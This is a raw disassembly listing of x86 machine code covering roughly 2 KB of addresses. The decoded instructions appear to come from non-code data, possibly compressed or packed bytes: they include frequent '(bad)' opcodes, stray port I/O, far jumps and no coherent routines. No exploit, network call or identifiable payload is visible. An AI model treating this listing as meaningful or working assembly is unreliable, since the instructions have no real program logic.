  409723:	cmp    BYTE PTR [edx],dl
  409725:	fdiv   st,st(2)
  409727:	or     dh,bl
  409729:	pop    esi
  40972a:	outs   dx,DWORD PTR ds:[esi]
  40972b:	(bad)  
  40972c:	sub    dh,BYTE PTR ss:[eax+0x382c00a4]
  409733:	add    edx,DWORD PTR [eax+0x5a243973]
  409739:	mov    ah,0xd8
  40973b:	jmp    0x58d0:0x26ad803f
  409742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409743:	xchg   esi,eax
  409744:	in     al,0x1c
  409746:	scas   al,BYTE PTR es:[edi]
  409747:	and    al,0x7
  409749:	sar    BYTE PTR [esi+0x1f],cl
  40974c:	dec    ebp
  40974d:	icebp  
  40974e:	fwait
  40974f:	or     al,bl
  409751:	mov    cl,0x77
  409753:	arpl   sp,ax
  409755:	aad    0x3b
  409757:	push   esi
  409758:	adc    esi,DWORD PTR [eax-0x4c]
  40975b:	jne    0x4097d0
  40975d:	dec    esp
  40975e:	and    al,0x7c
  409760:	xlat   BYTE PTR ds:[ebx]
  409761:	mov    al,0xe7
  409763:	das    
  409764:	cmc    
  409765:	mov    ecx,0x1085f72b
  40976a:	sar    DWORD PTR [edi-0x237693f6],cl
  409770:	cld    
  409771:	inc    esp
  409772:	addr16 inc esp
  409774:	pop    ds
  409775:	jne    0x4097f4
  409777:	cli    
  409778:	mov    ecx,0xfe4632af
  40977d:	or     BYTE PTR [eax],dl
  40977f:	sub    edi,ebx
  409781:	pop    edi
  409782:	lahf   
  409783:	mov    esi,0x1e162f1a
  409788:	and    dh,BYTE PTR [esi-0x69a55716]
  40978e:	lods   eax,DWORD PTR ds:[esi]
  40978f:	fwait
  409790:	mov    dl,BYTE PTR [edi]
  409792:	adc    DWORD PTR [ebx+0x370bd5c4],eax
  409798:	push   ss
  409799:	jg     0x409814
  40979b:	and    BYTE PTR [edx-0x4fae38e9],ah
  4097a1:	scas   al,BYTE PTR es:[edi]
  4097a2:	out    0x6,al
  4097a4:	pop    ebx
  4097a5:	mov    ebx,0x81300760
  4097aa:	test   BYTE PTR [ebp-0x4d179b80],dh
  4097b0:	and    DWORD PTR [ebx-0x54aaec8e],esp
  4097b6:	nop
  4097b7:	scas   eax,DWORD PTR es:[edi]
  4097b8:	iret   
  4097b9:	mov    ds:0xeb9a040e,al
  4097be:	(bad)  
  4097bf:	pop    ebp
  4097c0:	xchg   ebp,eax
  4097c1:	pop    es
  4097c2:	xor    bl,BYTE PTR [edx-0x1d5ce09d]
  4097c8:	push   ss
  4097c9:	(bad)  
  4097ca:	int    0xe3
  4097cc:	aad    0xad
  4097ce:	jg     0x409825
  4097d0:	ins    BYTE PTR es:[edi],dx
  4097d1:	inc    esi
  4097d2:	jbe    0x409805
  4097d4:	ret    0xc721
  4097d7:	jle    0x409795
  4097d9:	call   0xa440:0xf55921fb
  4097e0:	test   al,0xfb
  4097e2:	inc    ebp
  4097e3:	inc    esi
  4097e4:	pop    eax
  4097e5:	or     al,0xfe
  4097e7:	dec    eax
  4097e8:	and    cl,BYTE PTR [eax]
  4097ea:	adc    al,0xfa
  4097ec:	call   0xb380:0x6b58560f
  4097f3:	aam    0x73
  4097f5:	push   ecx
  4097f6:	fidivr WORD PTR ds:0xbc61878d
  4097fc:	out    dx,eax
  4097fd:	out    0xb5,al
  4097ff:	add    edx,edi
  409801:	jecxz  0x409865
  409803:	xchg   edi,eax
  409804:	inc    ebx
  409805:	(bad)  
  409806:	mov    eax,0xc4ba2c58
  40980b:	in     eax,dx
  40980c:	(bad)  
  40980d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40980e:	(bad)  
  40980f:	push   ds
  409810:	inc    ebp
  409811:	push   0x7
  409813:	mov    al,0x2b
  409815:	pop    ds
  409816:	pusha  
  409817:	sbb    al,0xda
  409819:	and    al,0xd5
  40981b:	rcl    al,cl
  40981d:	aad    0x44
  40981f:	pop    ds
  409820:	jno    0x409839
  409822:	aas    
  409823:	mov    ecx,0x28c273d9
  409828:	imul   BYTE PTR [edx]
  40982a:	sti    
  40982b:	les    ebp,FWORD PTR [eax]
  40982d:	add    eax,0xf7f61616
  409832:	dec    ebp
  409833:	add    edx,ebp
  409835:	xchg   esi,eax
  409836:	inc    esi
  409837:	mov    ebp,0x809edc15
  40983c:	imul   edi,DWORD PTR [ebp-0x78],0xffffff86
  409840:	(bad)  
  409841:	xchg   ecx,eax
  409842:	aad    0xde
  409844:	lahf   
  409845:	jp     0x4097c9
  409847:	and    DWORD PTR [eax-0x1bfdb10f],eax
  40984d:	popf   
  40984e:	xor    ecx,DWORD PTR [ebx]
  409850:	gs iret 
  409852:	mov    bh,0x18
  409854:	xor    BYTE PTR [edi+esi*2],ch
  409857:	mov    ss,WORD PTR [edi+ecx*1]
  40985a:	in     al,dx
  40985b:	cs (bad) 
  40985d:	jnp    0x40988e
  40985f:	test   DWORD PTR [edi*8+0x19b7e0df],0x2ad017b3
  40986a:	test   eax,0x1c1467a5
  40986f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409870:	(bad)  
  409871:	ins    BYTE PTR es:[edi],dx
  409872:	xor    dh,dh
  409874:	mov    ?,esi
  409876:	xchg   bl,ch
  409878:	sti    
  409879:	add    eax,0xec581c29
  40987e:	xchg   edx,eax
  40987f:	fldl2e 
  409881:	pop    esi
  409882:	out    0x43,al
  409884:	in     al,0x5d
  409886:	sbb    ebp,esi
  409888:	in     eax,0x46
  40988a:	mov    al,0x9e
  40988c:	and    esp,0xc16d23c6
  409892:	(bad)  
  409893:	cld    
  409894:	fstp   DWORD PTR [esi+esi*2-0x7174cf8a]
  40989b:	or     eax,0xd07f726b
  4098a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098a1:	xchg   edx,eax
  4098a2:	pop    ss
  4098a3:	cmp    BYTE PTR [edx],0xa5
  4098a6:	pop    eax
  4098a7:	add    al,0xcd
  4098a9:	cmc    
  4098aa:	into   
  4098ab:	repnz ins DWORD PTR es:[edi],dx
  4098ad:	sub    cl,BYTE PTR [ebp+0x35b16284]
  4098b3:	jmp    0xa929:0x1889ceaa
  4098ba:	in     eax,0x73
  4098bc:	aaa    
  4098bd:	or     esi,DWORD PTR ds:0x1ac7f8a5
  4098c3:	iret   
  4098c4:	add    bl,ah
  4098c6:	mov    esi,0xfc0ef25d
  4098cb:	xchg   edi,eax
  4098cc:	mov    ah,0xd3
  4098ce:	sbb    eax,0xc0b78a64
  4098d3:	adc    al,0x1f
  4098d5:	in     al,0x5a
  4098d7:	and    ah,ah
  4098d9:	test   edi,esp
  4098db:	mov    ch,0xd8
  4098dd:	cmp    al,0xb8
  4098df:	mov    bh,dh
  4098e1:	mov    WORD PTR [esi-0x5b84d899],?
  4098e7:	adc    BYTE PTR [edi],dl
  4098e9:	jno    0x4098a2
  4098eb:	es ds xor edi,edi
  4098ef:	out    dx,al
  4098f0:	outs   dx,DWORD PTR ds:[esi]
  4098f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098f2:	and    bh,dh
  4098f4:	aad    0x3a
  4098f6:	push   es
  4098f7:	inc    esi
  4098f8:	das    
  4098f9:	addr16 jnp 0x409958
  4098fc:	ins    BYTE PTR es:[edi],dx
  4098fd:	xchg   DWORD PTR [ebx-0x7],esp
  409900:	scas   al,BYTE PTR es:[edi]
  409901:	push   ebp
  409902:	mov    ds:0x409ca528,al
  409907:	stc    
  409908:	(bad)  
  409909:	adc    ecx,eax
  40990b:	fnstsw WORD PTR [esp+eax*1-0x35]
  40990f:	pusha  
  409910:	ja     0x409974
  409912:	call   0x7ee3883d
  409917:	jle    0x409974
  409919:	or     DWORD PTR ds:0x2bb5c941,esi
  40991f:	lock mov dh,0x3b
  409922:	inc    eax
  409923:	push   0xb9ab5b0a
  409928:	sub    al,0x18
  40992a:	popa   
  40992b:	inc    esp
  40992c:	add    eax,0x41a786a9
  409931:	and    cl,BYTE PTR [edi]
  409933:	aam    0x5
  409935:	mov    bh,BYTE PTR [esi]
  409937:	aaa    
  409938:	and    al,0xe9
  40993a:	pop    ecx
  40993b:	(bad)
  40993e:	repz xchg esi,eax
  409940:	fwait
  409941:	(bad)  
  409942:	jecxz  0x409937
  409944:	into   
  409945:	pop    ecx
  409946:	xchg   esi,eax
  409947:	sbb    esi,DWORD PTR [esi+esi*4]
  40994a:	das    
  40994b:	xchg   edx,eax
  40994c:	ins    DWORD PTR es:[edi],dx
  40994d:	xchg   BYTE PTR [ebp+0x19650a43],cl
  409953:	dec    eax
  409954:	sub    BYTE PTR [ebp-0x41ee9a22],al
  40995a:	cli    
  40995b:	push   ebx
  40995c:	iret   
  40995d:	dec    eax
  40995e:	mov    ebp,0x8440dab1
  409963:	cmp    eax,0x8ac7a8b2
  409968:	mov    ch,bh
  40996a:	loope  0x409971
  40996c:	add    eax,DWORD PTR [ebx]
  40996e:	scas   al,BYTE PTR es:[edi]
  40996f:	retf   0xb36e
  409972:	xchg   ecx,eax
  409973:	xor    BYTE PTR [esi+0x516347e4],bh
  409979:	sub    eax,esp
  40997b:	shl    BYTE PTR [ebp-0x23b2d680],0x84
  409982:	in     al,dx
  409983:	fwait
  409984:	lods   al,BYTE PTR ds:[esi]
  409985:	xlat   BYTE PTR ds:[ebx]
  409986:	jge    0x40992d
  409988:	lea    eax,[esi]
  40998a:	inc    edx
  40998b:	add    bl,BYTE PTR [ebx]
  40998d:	adc    eax,0xab1c9a71
  409992:	push   esi
  409993:	pop    edx
  409994:	jecxz  0x40997a
  409996:	stos   DWORD PTR es:[edi],eax
  409997:	or     al,0xa
  409999:	mov    esi,0x521fc40f
  40999e:	xchg   ebp,eax
  40999f:	xchg   ecx,eax
  4099a0:	ret    
  4099a1:	outs   dx,BYTE PTR ds:[esi]
  4099a2:	dec    esi
  4099a3:	sahf   
  4099a4:	(bad)  
  4099a5:	(bad)  
  4099a7:	aas    
  4099a8:	mov    eax,DWORD PTR [ebx-0x14]
  4099ab:	ss xchg edx,eax
  4099ad:	rol    DWORD PTR [esi],1
  4099af:	inc    esi
  4099b0:	sti    
  4099b1:	inc    edi
  4099b2:	mov    dl,BYTE PTR [ecx]
  4099b4:	sbb    ah,al
  4099b6:	test   al,cl
  4099b8:	pop    es
  4099b9:	jecxz  0x409a35
  4099bb:	inc    ecx
  4099bc:	jle    0x409987
  4099be:	pop    ds
  4099bf:	sub    ebx,DWORD PTR [esi+esi*8]
  4099c2:	imul   esi,DWORD PTR [ebx+0x6e],0xffffffeb
  4099c6:	xchg   ebx,eax
  4099c7:	ins    DWORD PTR es:[edi],dx
  4099c8:	clc    
  4099c9:	and    al,0xa7
  4099cb:	shl    DWORD PTR [ecx],1
  4099cd:	add    cl,al
  4099cf:	arpl   WORD PTR [ebp-0x58c4d6d3],si
  4099d5:	push   0xffffffb5
  4099d7:	cmp    eax,0x116239b1
  4099dc:	jle    0x409a4d
  4099de:	js     0x409983
  4099e0:	nop
  4099e1:	sahf   
  4099e2:	cmp    BYTE PTR [ebp+edx*2-0x25],0x9d
  4099e7:	das    
  4099e8:	ja     0x409a2b
  4099ea:	inc    edx
  4099eb:	shl    BYTE PTR [edx-0x33],1
  4099ee:	jecxz  0x409971
  4099f0:	mov    ds:0x3659a908,al
  4099f5:	ins    DWORD PTR es:[edi],dx
  4099f6:	jmp    0xeada:0x8b8b60c1
  4099fd:	stos   DWORD PTR es:[edi],eax
  4099fe:	cmp    esp,DWORD PTR [ecx]
  409a00:	jle    0x409a4d
  409a02:	mov    cl,BYTE PTR [ecx+eiz*4-0x425b73cd]
  409a09:	in     eax,dx
  409a0a:	hlt    
  409a0b:	add    BYTE PTR [eax-0x3d714fd],dl
  409a11:	cmp    eax,DWORD PTR [ebx+0x20]
  409a14:	loop   0x409a4e
  409a16:	sub    DWORD PTR [ebx+edx*4+0x9],esi
  409a1a:	cmc    
  409a1b:	stos   BYTE PTR es:[edi],al
  409a1c:	jg     0x4099e9
  409a1e:	sbb    cl,ch
  409a20:	and    DWORD PTR [eax],ebx
  409a22:	jb     0x4099ca
  409a24:	repz iret 
  409a26:	jnp    0x409a6b
  409a28:	dec    ebp
  409a29:	fnstenv [esi-0xb]
  409a2c:	mov    ebp,0x9aafc689
  409a31:	fnstcw WORD PTR [ecx+0x790b4a12]
  409a37:	jne    0x409a7b
  409a39:	adc    bl,BYTE PTR ds:0x22f9b210
  409a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a40:	(bad)  
  409a41:	in     al,dx
  409a42:	jge    0x409a4a
  409a44:	jno    0x409a0f
  409a46:	cli    
  409a47:	cli    
  409a48:	aam    0x92
  409a4a:	sahf   
  409a4b:	xchg   ecx,eax
  409a4c:	sub    eax,0x9449c4d6
  409a51:	mov    ds:0x1f67cff7,eax
  409a56:	jg     0x409a1f
  409a58:	dec    ebx
  409a59:	hlt    
  409a5a:	fiadd  DWORD PTR [ecx+eax*2+0x52]
  409a5e:	mov    WORD PTR [esi],?
  409a60:	not    DWORD PTR [eax]
  409a62:	and    al,0x22
  409a64:	shl    DWORD PTR [esi-0x42601c0e],1
  409a6a:	dec    ebp
  409a6b:	in     al,0xf4
  409a6d:	or     eax,0x8ba0b7f9
  409a72:	adc    ebx,esp
  409a74:	inc    edi
  409a75:	pop    ds
  409a76:	int3   
  409a77:	adc    al,0x1e
  409a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a7a:	fcom   DWORD PTR [ebp-0x59ae1926]
  409a80:	pop    ss
  409a81:	add    DWORD PTR [eax-0x4a0d9360],ecx
  409a87:	xchg   ebx,eax
  409a88:	jne    0x409aff
  409a8a:	test   DWORD PTR [eax],edi
  409a8c:	out    0xba,eax
  409a8e:	sti    
  409a8f:	pop    es
  409a90:	mov    ecx,0xa215e664
  409a95:	mov    al,ds:0x41f1f0ab
  409a9a:	inc    edx
  409a9b:	mov    ?,WORD PTR [ebx+eax*1+0x1a]
  409a9f:	inc    edi
  409aa0:	repz mov bl,0x6e
  409aa3:	out    dx,eax
  409aa4:	push   edi
  409aa5:	pop    edi
  409aa6:	shl    DWORD PTR [edi],1
  409aa8:	fwait
  409aa9:	into   
  409aaa:	js     0x409aa4
  409aac:	adc    DWORD PTR [eax+edi*1],ebx
  409aaf:	pop    ss
  409ab0:	inc    esi
  409ab1:	cmp    BYTE PTR [esi],bl
  409ab3:	dec    esp
  409ab4:	mov    eax,ds:0xcbe2dbc
  409ab9:	dec    edx
  409aba:	mov    cl,0x4b
  409abc:	nop
  409abd:	out    dx,al
  409abe:	cmp    BYTE PTR [esi],ch
  409ac0:	or     dl,BYTE PTR [edx]
  409ac2:	into   
  409ac3:	push   eax
  409ac4:	fnstcw WORD PTR [edx]
  409ac6:	xchg   esp,eax
  409ac7:	mov    ecx,0x17a19097
  409acc:	sbb    ebx,DWORD PTR [esi+eax*1]
  409acf:	popf   
  409ad0:	cdq    
  409ad1:	ds ins BYTE PTR es:[edi],dx
  409ad3:	and    BYTE PTR [edi],ch
  409ad5:	pop    esi
  409ad6:	jbe    0x409b16
  409ad8:	sub    DWORD PTR ds:0xf591ca0,esi
  409ade:	add    dl,BYTE PTR [edx+0x2c0d2fb9]
  409ae4:	pop    eax
  409ae5:	or     DWORD PTR [edi+0x55],ebp
  409ae8:	adc    esi,eax
  409aea:	int3   
  409aeb:	xchg   BYTE PTR [ebp+edx*2+0x6de9f7ef],bl
  409af2:	ss aam 0x8b
  409af5:	push   0x180531c5
  409afa:	mov    dh,0xa9
  409afc:	cld    
  409afd:	imul   DWORD PTR [edi-0x18913178]
  409b03:	daa    
  409b04:	add    BYTE PTR [ecx+0x4f],0x68
  409b08:	stc    
  409b09:	bound  esi,QWORD PTR [esi-0x7e5b0b90]
  409b0f:	mov    bh,0x46
  409b11:	test   esi,edi
  409b13:	or     al,0xc9
  409b15:	pop    fs
  409b17:	daa    
  409b18:	ja     0x409ad5
  409b1a:	jmp    0xf15f0d5c
  409b1f:	pop    edi
  409b20:	mov    edi,0x10042cf
  409b25:	sar    cl,0xff
  409b28:	nop
  409b29:	(bad)  
  409b2a:	jns    0x409b5e
  409b2c:	add    DWORD PTR [ebp+0x6ffed6c8],edx
  409b32:	lds    eax,FWORD PTR [esi-0x72]
  409b35:	sbb    al,0x55
  409b37:	mov    esi,0xcc6b9df9
  409b3c:	push   ecx
  409b3d:	cli    
  409b3e:	or     DWORD PTR [esi],eax
  409b40:	clc    
  409b41:	adc    al,0x37
  409b43:	inc    ecx
  409b44:	dec    ecx
  409b45:	jp     0x409ae3
  409b47:	xchg   ecx,eax
  409b48:	enter  0x434b,0x80
  409b4c:	xor    BYTE PTR [edx],dh
  409b4e:	xor    esi,DWORD PTR [ebx+0x1]
  409b51:	xlat   BYTE PTR ds:[ebx]
  409b52:	pop    esi
  409b53:	sub    DWORD PTR [bp-0x3f8d],eax
  409b58:	xchg   DWORD PTR [ecx-0x8],ebx
  409b5b:	push   eax
  409b5c:	mov    eax,0xc15b0077
  409b61:	lahf   
  409b62:	cmp    al,0xc9
  409b64:	jne    0x409b31
  409b66:	ret    
  409b67:	xor    esp,ebp
  409b69:	call   0x1a0bacae
  409b6e:	mov    ecx,0xbe6dd391
  409b73:	jnp    0x409b17
  409b75:	cdq    
  409b76:	pop    es
  409b77:	pop    edx
  409b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b79:	sub    ebp,esi
  409b7b:	aad    0xee
  409b7d:	outs   dx,BYTE PTR ds:[esi]
  409b7e:	stc    
  409b7f:	rcl    eax,cl
  409b81:	(bad)  
  409b82:	fucom  st(2)
  409b84:	mov    ch,0xfb
  409b86:	add    edi,ebp
  409b88:	ret    
  409b89:	popa   
  409b8a:	or     BYTE PTR [ebp-0x37],dh
  409b8d:	jge    0x409b78
  409b8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b90:	mov    ecx,0xd722d22
  409b95:	ds nop
  409b97:	cmp    cl,BYTE PTR [edi]
  409b99:	mov    dh,0x70
  409b9b:	pop    edx
  409b9c:	dec    ebx
  409b9d:	mov    ch,0x24
  409b9f:	in     al,0xb5
  409ba1:	int    0x55
  409ba3:	outs   dx,DWORD PTR ds:[esi]
  409ba4:	popf   
  409ba5:	xchg   ebx,eax
  409ba6:	mov    dl,BYTE PTR [esp+eax*2-0xbc6e098]
  409bad:	jae    0x409bad
  409baf:	inc    ebp
  409bb0:	icebp  
  409bb1:	mov    ah,0xf5
  409bb3:	mov    cl,0x85
  409bb5:	repnz inc esp
  409bb7:	xlat   BYTE PTR ds:[ebx]
  409bb8:	mov    gs,WORD PTR [ebp+0x864de28]
  409bbe:	ja     0x409b72
  409bc0:	inc    esp
  409bc1:	mov    dl,0x4b
  409bc3:	iret   
  409bc4:	ins    DWORD PTR es:[edi],dx
  409bc5:	inc    edi
  409bc6:	mov    edi,0x2a28731d
  409bcb:	fcomp  DWORD PTR [eax]
  409bcd:	fisub  DWORD PTR [esi-0x3f]
  409bd0:	jp     0x409bd7
  409bd2:	mov    dl,0xde
  409bd4:	sub    DWORD PTR [edx+0x8],0xd86c9d53
  409bdb:	sub    eax,DWORD PTR [ecx+0x6d]
  409bde:	loope  0x409b9c
  409be0:	mov    esp,ebx
  409be2:	mov    al,0xab
  409be4:	xchg   edi,eax
  409be5:	xchg   edx,eax
  409be6:	add    bh,bh
  409be8:	dec    esi
  409be9:	inc    esi
  409bea:	jo     0x409b6c
  409bec:	sbb    BYTE PTR gs:[edx],0xc5
  409bf0:	leave  
  409bf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bf2:	dec    ebp
  409bf3:	fist   WORD PTR [edi]
  409bf5:	xor    eax,0x3a710903
  409bfa:	leave  
  409bfb:	repz push 0xb3c4e92f
  409c01:	into   
  409c02:	icebp  
  409c03:	mov    bh,bl
  409c05:	test   BYTE PTR gs:[ecx-0x59ac9384],0xa9
  409c0d:	lods   eax,DWORD PTR ds:[esi]
  409c0e:	and    al,0x1c
  409c10:	repz loop 0x409bb0
  409c13:	sahf   
  409c14:	inc    eax
  409c15:	push   0x2baaaec5
  409c1a:	jo     0x409bf9
  409c1c:	test   eax,0xb211f8c1
  409c21:	sahf   
  409c22:	aas    
  409c23:	js     0x409c64
  409c25:	or     DWORD PTR ds:0x831b9230,edx
  409c2b:	mov    bh,0xae
  409c2d:	jnp    0x409c27
  409c2f:	test   eax,0xeb33f1a5
  409c34:	(bad)  
  409c35:	ficomp DWORD PTR [edx-0x58966183]
  409c3b:	jnp    0x409bda
  409c3d:	fsub   DWORD PTR [eax+eiz*4+0x103c6796]
  409c44:	sbb    BYTE PTR [esi+0x4ae6ef4c],ch
  409c4a:	mov    WORD PTR ss:[ecx-0x5a],?
  409c4e:	mov    dl,0xef
  409c50:	push   ss
  409c51:	xchg   edi,eax
  409c52:	jmp    0x270a:0x1942edc8
  409c59:	pushf  
  409c5a:	adc    DWORD PTR [esi+0x11],edx
  409c5d:	push   0x7bef2148
  409c62:	repnz sahf 
  409c64:	ins    DWORD PTR es:[edi],dx
  409c65:	cmp    al,0x1c
  409c67:	stos   DWORD PTR es:[edi],eax
  409c68:	dec    esp
  409c69:	clc    
  409c6a:	xor    ah,BYTE PTR [edx+ebp*8-0x75]
  409c6e:	sbb    esi,DWORD PTR [ebp+0x9]
  409c71:	add    al,0x39
  409c73:	enter  0xaae1,0xc5
  409c77:	js     0x409cea
  409c79:	pop    esi
  409c7a:	imul   edi,ebx,0x2e
  409c7d:	jae    0x409cbb
  409c7f:	push   edx
  409c80:	xchg   edi,eax
  409c81:	imul   eax,DWORD PTR [ecx+0x27],0x6ed88a25
  409c88:	mov    DWORD PTR [eax-0x19457359],ebx
  409c8e:	push   esi
  409c8f:	pop    edx
  409c90:	mov    ds:0x9dc324af,eax
  409c96:	outs   dx,DWORD PTR ds:[esi]
	...
  409d13:	add    BYTE PTR [ebx],dl
  409d15:	or     eax,0xf7be76a8
  409d1a:	fild   QWORD PTR [ebp-0x8]
  409d1d:	out    0xa8,al
  409d1f:	repz pop edi
  409d21:	out    0x39,eax
  409d23:	sub    al,0x4f
  409d26:	add    BYTE PTR [eax],al
  409d28:	imul   eax,DWORD PTR [edi],0x0
  409d2b:	add    BYTE PTR [esi+eax*8+0x7f4694b5],ch
  409d32:	es adc eax,0xd43d2984
  409d38:	adc    cl,BYTE PTR [eax]
  409d3a:	mov    gs,WORD PTR [edi]
  409d3c:	mov    cl,0xcd
  409d3e:	mov    esp,eax
  409d40:	mov    eax,0xa6985f12
  409d45:	or     DWORD PTR ds:0x4ae1069d,0x4a42c291
  409d50:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d52:	sti    
  409d53:	xchg   ebp,eax
  409d54:	dec    esp
  409d55:	mov    eax,ds:0x2a0d827c
  409d5a:	jle    0x409d38
  409d5c:	sub    edi,ebx
  409d5e:	aad    0x9d
  409d60:	push   edi
  409d61:	out    dx,al
  409d62:	push   cs
  409d63:	jno    0x409d02
  409d65:	jns    0x409d69
  409d67:	enter  0xe2cc,0x28
  409d6b:	sbb    BYTE PTR [esi-0x2ac3b6aa],0x4f
  409d72:	adc    al,0xee
  409d74:	xor    eax,0xc5f38fad
  409d79:	mov    al,ds:0xca40623a
  409d7e:	out    dx,eax
  409d7f:	xchg   edx,eax
  409d80:	push   ss
  409d81:	xchg   edi,eax
  409d82:	cmp    DWORD PTR [ecx+ecx*8+0x3ae9b5ad],esi
  409d89:	(bad)  
  409d8a:	rcl    bl,0xc8
  409d8d:	inc    esi
  409d8e:	das    
  409d8f:	push   esi
  409d90:	and    DWORD PTR [ecx+0x747c4b06],0x15
  409d97:	pop    ebx
  409d98:	paddw  mm7,QWORD PTR fs:[edi-0xa]
  409d9d:	push   esi
  409d9e:	add    ebp,DWORD PTR [ebx]
  409da0:	(bad)  
  409da1:	enter  0x6941,0x77
  409da5:	(bad)  
  409da6:	je     0x409db0
  409da8:	arpl   WORD PTR [ebx+0x2d70efd9],sp
  409dae:	add    DWORD PTR [edx],esp
  409db0:	in     eax,dx
  409db1:	jg     0x409d45
  409db3:	icebp  
  409db4:	mov    eax,0x8ed0e8b4
  409db9:	mov    dh,0xaa
  409dbb:	shl    BYTE PTR [ecx+0x13],cl
  409dbe:	jmp    0x409e08
  409dc0:	int3   
  409dc1:	pop    eax
  409dc2:	nop
  409dc3:	sbb    cl,dl
  409dc5:	mov    esi,0x2e5bbb52
  409dca:	sbb    DWORD PTR [edx+0x0],ebx
  409dcd:	and    al,0x90
  409dcf:	jg     0x409d89
  409dd1:	inc    esi
  409dd2:	fcmovne st,st(3)
  409dd4:	cmp    esp,eax
  409dd6:	xor    eax,0x7215db6a
  409ddb:	sahf   
  409ddc:	and    al,0x20
  409dde:	mov    ds:0xfbd9f27,al
  409de3:	leave  
  409de4:	aas    
  409de5:	sbb    al,0x39
  409de7:	xor    DWORD PTR [eax-0x69f9e64e],ebx
  409ded:	lods   al,BYTE PTR ds:[esi]
  409dee:	and    BYTE PTR [ebp+0x58],dl
  409df1:	fadd   DWORD PTR [esi]
  409df3:	(bad)  
  409df4:	nop
  409df5:	or     bh,0x10
  409df8:	nop
  409df9:	sahf   
  409dfa:	lods   al,BYTE PTR ds:[esi]
  409dfc:	sub    al,0xf3
  409dfe:	xchg   bl,dh
  409e00:	pop    esi
  409e01:	leave  
  409e02:	push   ebp
  409e03:	iret   
  409e04:	out    0x1,eax
  409e06:	jmp    0xe1713ee5
  409e0b:	(bad)  
  409e0c:	push   es
  409e0d:	into   
  409e0e:	inc    ecx
  409e0f:	mov    ch,al
  409e11:	dec    DWORD PTR [eax-0x65]
  409e14:	mov    al,0x29
  409e16:	clc    
  409e17:	sbb    eax,0xb57c22bf
  409e1c:	sbb    DWORD PTR [ebx],0xffffff92
  409e1f:	jbe    0x409e18
  409e21:	(bad)  
  409e22:	jmp    0x409e27
  409e24:	shl    DWORD PTR [esi*8-0x51e9b8d5],cl
  409e2b:	inc    esi
  409e2c:	xchg   ebx,eax
  409e2d:	call   FWORD PTR gs:[esi]
  409e30:	xchg   ebx,eax
  409e31:	jae    0x409e96
  409e33:	push   edx
  409e34:	in     eax,0x24
  409e36:	fst    QWORD PTR [ebp+0x46]
  409e39:	dec    edi
  409e3a:	arpl   WORD PTR [ecx+ebp*1],si
  409e3d:	mov    bh,0xf0
  409e3f:	mov    ecx,0x6767e74
  409e45:	jo     0x409e68
  409e47:	stos   DWORD PTR es:[edi],eax
  409e48:	call   0x9cfc:0x2aee900e
  409e4f:	ret    0x49f2
  409e52:	int3   
  409e53:	adc    bl,ch
  409e55:	add    bl,0x3b
  409e58:	push   ebx
  409e59:	mov    DWORD PTR [ebp-0x536819af],ebx
  409e5f:	ins    DWORD PTR es:[edi],dx
  409e60:	cdq    
  409e61:	mov    dh,BYTE PTR [ecx-0x17]
  409e64:	xlat   BYTE PTR ds:[ebx]
  409e65:	sub    al,0x84
  409e67:	dec    ebp
  409e68:	sub    BYTE PTR [ebx+0x41],0x7b
  409e6c:	sbb    bl,dh
  409e6e:	scas   al,BYTE PTR es:[edi]
  409e6f:	ins    BYTE PTR es:[edi],dx
  409e70:	sub    ch,BYTE PTR [esi-0x2a546764]
  409e76:	xor    al,0x42
  409e78:	xchg   DWORD PTR [ebp-0x7384f8e4],ebp
  409e7e:	(bad)  
  409e7f:	popf   
  409e80:	loop   0x409ebd
  409e82:	add    eax,0xc6aa69d7
  409e87:	nop
  409e88:	retf   0xeee
  409e8b:	test   al,bl
  409e8d:	and    DWORD PTR [ebp-0x6a],ecx
  409e90:	arpl   WORD PTR [ebx],di
  409e92:	nop
  409e93:	cdq    
  409e94:	jnp    0x409e1a
  409e96:	adc    eax,0xe33c0591
  409e9b:	lods   eax,DWORD PTR ds:[esi]
  409e9c:	test   DWORD PTR [ebp-0x51],ecx
  409e9f:	push   esi
  409ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ea1:	dec    esi
  409ea2:	mov    esi,0x82e6dc00
  409ea7:	mov    ecx,0x97af59c9
  409eac:	and    esp,DWORD PTR [esi]
  409eae:	(bad)  
  409eb0:	mov    fs,WORD PTR [ecx-0x5b6de04c]
  409eb6:	js     0x409f22
  409eb8:	xchg   edi,eax
  409eb9:	in     al,0x2b
  409ebb:	or     BYTE PTR [edx-0x64],al
  409ebe:	std    
  409ebf:	mov    dl,0x84
  409ec1:	popa   
  409ec2:	inc    edi
  409ec3:	mov    esi,0x38c3e312
  409ec8:	sahf   
  409ec9:	or     DWORD PTR [esi],eax
  409ecb:	and    DWORD PTR ss:[ecx],esp
  409ece:	xchg   esi,eax
  409ecf:	test   al,0x7a
  409ed1:	(bad)  
  409ed2:	dec    esi
  409ed3:	ja     0x409f32
  409ed5:	std    
  409ed6:	inc    ebp
  409ed7:	or     esp,ebp
  409ed9:	outs   dx,DWORD PTR ds:[esi]
  409eda:	fadd   QWORD PTR [edi]
  409edc:	in     eax,0x76
  409ede:	jmp    0x49c268c0
  409ee3:	cld    
  409ee4:	add    bh,BYTE PTR [ebp-0x427629fb]
  409eea:	sbb    dl,BYTE PTR [esi]
  409eec:	add    ebx,DWORD PTR [ecx+0x567d5c27]
  409ef2:	out    0x80,al
  409ef4:	mov    ds:0xf7a62293,al
  409ef9:	enter  0x3e8c,0x6e
  409efd:	cdq    
  409efe:	lods   eax,DWORD PTR ds:[esi]
  409eff:	out    dx,al
  409f00:	mov    dl,0x6c
  409f02:	test   BYTE PTR [esi+0x1f],bl
  409f05:	ds imul eax,esi,0x57
  409f09:	jnp    0x409f7c
  409f0b:	inc    edi
  409f0c:	jne    0x409f35
  409f0e:	sbb    BYTE PTR [ebp-0x56],0x7a
  409f12:	mov    eax,0xb20dc97a
  409f17:	jb     0x409f2f
  409f19:	aam    0xe5
